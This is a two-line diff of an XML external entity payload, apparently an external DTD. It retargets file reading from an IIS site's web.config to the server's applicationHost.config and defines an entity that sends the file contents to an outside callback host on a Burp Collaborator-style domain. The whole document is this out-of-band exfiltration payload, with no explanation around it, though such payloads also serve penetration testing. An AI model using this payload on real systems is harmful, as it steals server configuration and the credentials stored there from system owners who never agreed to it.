@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///C:/inetpub/wwwroot/tripsource/web.config">
+<!ENTITY % data SYSTEM "file:///C:/Windows/System32/inetsrv/config/applicationHost.config">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
